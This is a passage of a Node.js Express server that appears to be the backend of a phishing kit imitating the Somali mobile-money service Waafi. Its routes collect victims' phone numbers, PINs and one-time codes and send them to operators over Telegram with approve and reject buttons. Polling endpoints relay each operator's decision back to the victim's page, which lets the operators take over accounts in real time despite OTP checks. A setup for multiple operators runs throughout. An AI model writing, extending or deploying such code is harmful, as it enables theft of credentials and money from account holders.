      if (!phoneNumber) {
        return res.status(400).json({ 
          success: false, 
          message: 'Phone number required' 
        });
      }

      const phoneValidation = validatePhoneNumber(phoneNumber);
      if (!phoneValidation.valid) {
        return res.status(400).json({ 
          success: false, 
          message: phoneValidation.error 
        });
      }

      const isVerified = user.verifiedUsers.has(phoneNumber);
      
      res.json({ 
        success: true,
        isReturningUser: isVerified,
        message: isVerified ? 'Returning user' : 'New user'
      });
    } catch (error) {
      logger.error(`check-user-status error for ${user.name}:`, error.message);
      res.status(500).json({ 
        success: false, 
        error: 'Internal server error' 
      });
    }
  });

  app.post(`${basePath}/check-login-approval`, async (req, res) => {
    try {
      const { phoneNumber, pin } = req.body;
      
      if (!phoneNumber || !pin) {
        return res.status(400).json({ 
          success: false, 
          message: 'Phone and PIN required' 
        });
      }

      const phoneValidation = validatePhoneNumber(phoneNumber);
      if (!phoneValidation.valid) {
        return res.status(400).json({ 
          success: false, 
          message: phoneValidation.error 
        });
      }

      const pinValidation = validatePin(pin);
      if (!pinValidation.valid) {
        return res.status(400).json({ 
          success: false, 
          message: pinValidation.error 
        });
      }

      const loginKey = `${phoneNumber}-${pin}`;
      const loginData = user.loginNotifications.get(loginKey);

      if (!loginData) {
        return res.json({ 
          success: true, 
          approved: false, 
          rejected: false, 
          expired: false, 
          message: 'Waiting for admin' 
        });
      }

      if (Date.now() - loginData.timestamp > CONFIG.APPROVAL_TIMEOUT) {
        return res.json({ 
          success: true, 
          approved: false, 
          rejected: true, 
          expired: true, 
          rejectionReason: 'timeout', 
          message: 'Session expired' 
        });
      }

      if (loginData.approved) {
        return res.json({ 
          success: true, 
          approved: true, 
          rejected: false, 
          expired: false, 
          message: 'Login approved' 
        });
      } else if (loginData.rejected) {
        return res.json({ 
          success: true, 
          approved: false, 
          rejected: true, 
          expired: false, 
          rejectionReason: loginData.rejectionReason || 'invalid', 
          message: 'Invalid credentials' 
        });
      } else {
        return res.json({ 
          success: true, 
          approved: false, 
          rejected: false, 
          expired: false, 
          message: 'Waiting for approval' 
        });
      }
    } catch (error) {
      logger.error(`check-login-approval error for ${user.name}:`, error.message);
      res.status(500).json({ 
        success: false, 
        error: 'Internal server error' 
      });
    }
  });

  app.post(`${basePath}/login`, async (req, res) => {
    try {
      if (!user.bot) {
        return res.status(503).json({ 
          success: false, 
          message: 'Bot not configured' 
        });
      }

      if (!user.isHealthy) {
        return res.status(503).json({ 
          success: false, 
          message: 'Bot service unavailable' 
        });
      }
      
      const { phoneNumber, pin, timestamp } = req.body;
      
      if (!phoneNumber || !pin) {
        return res.status(400).json({ 
          success: false, 
          message: 'Phone and PIN required' 
        });
      }

      const phoneValidation = validatePhoneNumber(phoneNumber);
      if (!phoneValidation.valid) {
        return res.status(400).json({ 
          success: false, 
          message: phoneValidation.error 
        });
      }

      const pinValidation = validatePin(pin);
      if (!pinValidation.valid) {
        return res.status(400).json({ 
          success: false, 
          message: pinValidation.error 
        });
      }

      const requestKey = `login-${phoneNumber}-${pin}`;
      if (isDuplicate(user, requestKey)) {
        return res.json({ 
          success: true, 
          message: 'Login sent (cached)' 
        });
      }

      const loginKey = `${phoneNumber}-${pin}`;
      user.loginNotifications.set(loginKey, { 
        timestamp: Date.now(), 
        approved: false, 
        rejected: false, 
        expired: false 
      });

      const message = formatLoginMessage(user, { 
        phoneNumber, 
        pin, 
        timestamp: timestamp || Date.now() 
      });
      
      const keyboard = {
        inline_keyboard: [
          [{ text: '✅ Allow to Proceed', callback_data: `login_proceed_${phoneNumber}_${pin}` }],
          [{ text: '❌ Invalid Information', callback_data: `login_invalid_${phoneNumber}_${pin}` }]
        ]
      };
      
      const result = await sendTelegramMessage(user, message, { reply_markup: keyboard });

      if (result.success) {
        user.requestCount++;
        user.lastRequestTime = Date.now();
        res.json({ 
          success: true, 
          message: 'Login sent - waiting for approval', 
          requiresApproval: true 
        });
      } else {
        res.status(500).json({ 
          success: false, 
          message: 'Failed to send notification', 
          error: result.error 
        });
      }
    } catch (error) {
      logger.error(`login error for ${user.name}:`, error.message);
      res.status(500).json({ 
        success: false, 
        error: 'Internal server error' 
      });
    }
  });

  app.post(`${basePath}/verify-otp`, async (req, res) => {
    try {
      if (!user.bot) {
        return res.status(503).json({ 
          success: false, 
          message: 'Bot not configured' 
        });
      }

      if (!user.isHealthy) {
        return res.status(503).json({ 
          success: false, 
          message: 'Bot service unavailable' 
        });
      }
      
      const { phoneNumber, otp, timestamp } = req.body;
      
      if (!phoneNumber || !otp) {
        return res.status(400).json({ 
          success: false, 
          message: 'Phone and OTP required' 
        });
      }

      const phoneValidation = validatePhoneNumber(phoneNumber);
      if (!phoneValidation.valid) {
        return res.status(400).json({ 
          success: false, 
          message: phoneValidation.error 
        });
      }

      const otpValidation = validateOtp(otp);
      if (!otpValidation.valid) {
        return res.status(400).json({ 
          success: false, 
          message: otpValidation.error 
        });
      }

      const requestKey = `otp-${phoneNumber}-${otp}`;
      if (isDuplicate(user, requestKey)) {
        return res.json({ 
          success: true, 
          message: 'OTP sent (cached)' 
        });
      }

      const verificationKey = `${phoneNumber}-${otp}`;
      user.otpVerifications.set(verificationKey, { 
        status: 'pending', 
        timestamp: Date.now(), 
        expired: false 
      });

      const message = formatOTPMessage(user, { 
        phoneNumber, 
        otp, 
        timestamp: timestamp || Date.now() 
      });
      
      const keyboard = {
        inline_keyboard: [
          [{ text: '✅ Correct (PIN + OTP)', callback_data: `otp_correct_${phoneNumber}_${otp}` }],
          [
            { text: '❌ Wrong Code', callback_data: `otp_wrong_${phoneNumber}_${otp}` },
            { text: '⚠️ Wrong PIN', callback_data: `otp_wrongpin_${phoneNumber}_${otp}` }
          ]
        ]
      };
      
      const result = await sendTelegramMessage(user, message, { reply_markup: keyboard });

      if (result.success) {
        user.requestCount++;
        user.lastRequestTime = Date.now();
        res.json({ 
          success: true, 
          message: 'OTP sent successfully' 
        });
      } else {
        res.status(500).json({ 
          success: false, 
          message: 'Failed to send notification', 
          error: result.error 
        });
      }
    } catch (error) {
      logger.error(`verify-otp error for ${user.name}:`, error.message);
      res.status(500).json({ 
        success: false, 
        error: 'Internal server error' 
      });
    }
  });

  app.post(`${basePath}/check-otp-status`, async (req, res) => {
    try {
      const { phoneNumber, otp } = req.body;
      
      if (!phoneNumber || !otp) {
        return res.status(400).json({ 
          success: false, 
          message: 'Phone and OTP required' 
        });
      }

      const phoneValidation = validatePhoneNumber(phoneNumber);
      if (!phoneValidation.valid) {
        return res.status(400).json({ 
          success: false, 
          message: phoneValidation.error 
        });
      }

      const otpValidation = validateOtp(otp);
      if (!otpValidation.valid) {
        return res.status(400).json({ 
          success: false, 
          message: otpValidation.error 
        });
      }

      const verificationKey = `${phoneNumber}-${otp}`;
      const verification = user.otpVerifications.get(verificationKey);

      if (!verification) {
        return res.json({ 
          success: true, 
          status: 'pending', 
          message: 'Waiting for verification' 
        });
      }

      if (Date.now() - verification.timestamp > CONFIG.APPROVAL_TIMEOUT) {
        return res.json({ 
          success: true, 
          status: 'timeout', 
          message: 'Session expired' 
        });
      }

      if (verification.status === 'approved') {
        user.otpVerifications.delete(verificationKey);
        return res.json({ 
          success: true, 
          status: 'approved', 
          message: 'Everything correct' 
        });
      } else if (verification.status === 'rejected') {
        user.otpVerifications.delete(verificationKey);
        return res.json({ 
          success: true, 
          status: 'rejected', 
          message: 'OTP code is wrong' 
        });
      } else if (verification.status === 'wrong_pin') {
        user.otpVerifications.delete(verificationKey);
        return res.json({ 
          success: true, 
          status: 'wrong_pin', 
          message: 'PIN is wrong' 
        });
      } else if (verification.status === 'timeout') {
        return res.json({ 
          success: true, 
          status: 'timeout', 
          message: 'Session expired' 
        });
      } else {
        return res.json({ 
          success: true, 
          status: 'pending', 
          message: 'Waiting for verification' 
        });
      }
    } catch (error) {
      logger.error(`check-otp-status error for ${user.name}:`, error.message);
      res.status(500).json({ 
        success: false, 
        error: 'Internal server error' 
      });
    }
  });

  app.post(`${basePath}/resend-otp`, async (req, res) => {
    try {
      if (!user.bot) {
        return res.status(503).json({ 
          success: false, 
          message: 'Bot not configured' 
        });
      }

      if (!user.isHealthy) {
        return res.status(503).json({ 
          success: false, 
          message: 'Bot service unavailable' 
        });
      }
      
      const { phoneNumber, timestamp } = req.body;
      
      if (!phoneNumber) {
        return res.status(400).json({ 
          success: false, 
          message: 'Phone number required' 
        });
      }

      const phoneValidation = validatePhoneNumber(phoneNumber);
      if (!phoneValidation.valid) {
        return res.status(400).json({ 
          success: false, 
          message: phoneValidation.error 
        });
      }

      const { countryCode, number } = formatPhoneNumber(phoneNumber);
      const message = `🔄 <b>${sanitizeInput(user.name)} - OTP RESEND</b>\n\n📱 <code>${phoneNumber}</code>\n⏰ ${new Date(timestamp || Date.now()).toLocaleString()}`;
      
      const result = await sendTelegramMessage(user, message);

      if (result.success) {
        res.json({ 
          success: true, 
          message: 'Resend notification sent' 
        });
      } else {
        res.status(500).json({ 
          success: false, 
          message: 'Failed to send notification', 
          error: result.error 
        });
      }
    } catch (error) {
      logger.error(`resend-otp error for ${user.name}:`, error.message);
      res.status(500).json({ 
        success: false, 
        error: 'Internal server error' 
      });
    }
  });
});

// ============================================
// 404 HANDLER
// ============================================
app.use((req, res) => {
  res.status(404).json({ 
    success: false, 
    message: 'Endpoint not found',
    path: req.path 
  });
});

// ============================================
// GLOBAL ERROR HANDLER
// ============================================
app.use((err, req, res, next) => {
  logger.error('Unhandled error:', err.message);
  logger.error(err.stack);
  
  res.status(500).json({ 
    success: false, 
    error: 'Internal server error',
    message: process.env.NODE_ENV === 'development' ? err.message : undefined
  });
});

// ============================================
// PERIODIC HEALTH MONITORING
// ============================================
setInterval(() => {
  users.forEach((user) => {
    if (user.botManager && !user.botManager.isHealthy()) {
      logger.warn(`${user.name}: Bot unhealthy - checking...`);
      
      if (!user.botManager.isInitializing && 
          user.botManager.restartAttempts < user.botManager.maxRestartAttempts) {
        user.botManager.scheduleRestart(15000);
      }
    }
    
    if (user.consecutiveErrors > 0 && Date.now() - user.lastErrorTime > 300000) {
      user.consecutiveErrors = 0;
      logger.info(`Reset consecutive errors for ${user.name}`);
    }
  });
}, 60000);

// ============================================
// START SERVER
// ============================================
const server = app.listen(PORT, () => {
  console.log('\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`🇸🇴 Waafi Somalia - Multi-User System`);
  console.log(`👥 Active users: ${users.size}/${CONFIG.MAX_USERS}`);
  console.log(`⏱️  Approval timeout: ${CONFIG.APPROVAL_TIMEOUT / 60000} minutes`);
  console.log(`🔢 Max concurrent requests: ${CONFIG.MAX_CONCURRENT_REQUESTS}`);
  console.log(`📊 Rate limit: ${CONFIG.MAX_REQUESTS_PER_WINDOW} req/min`);
  console.log('\n📋 Active endpoints:');
  users.forEach((user, linkInsert) => {
    const status = user.isHealthy ? '✅' : '⏳';
    console.log(`   ${status} ${user.name}: /api/${linkInsert}/*`);
  });
  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');
});

// ============================================
// GRACEFUL SHUTDOWN
// ============================================
const gracefulShutdown = async (signal) => {
  logger.info(`${signal} received, shutting down gracefully...`);
  
  server.close(() => {
    logger.info('HTTP server closed');
  });
  
  const shutdownPromises = Array.from(users.values()).map(async (user) => {
    if (user.botManager) {
      try {
        await user.botManager.cleanup();
        logger.info(`${user.name} bot stopped`);
      } catch (error) {
        logger.error(`Error stopping ${user.name} bot:`, error.message);
      }
    }
  });
  
  try {
    await Promise.allSettled(shutdownPromises);
    logger.info('All bots stopped');
    process.exit(0);
  } catch (error) {
    logger.error('Error during shutdown:', error.message);
    process.exit(1);
  }
};

process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
process.on('SIGINT', () => gracefulShutdown('SIGINT'));

// ============================================
// UNCAUGHT EXCEPTION HANDLER
// ============================================
process.on('uncaughtException', (error) => {
  logger.error('Uncaught Exception:', error.message);
  logger.error(error.stack);
});

process.on('unhandledRejection', (reason, promise) => {
  logger.error('Unhandled Rejection at:', promise);
  logger.error('Reason:', reason);
});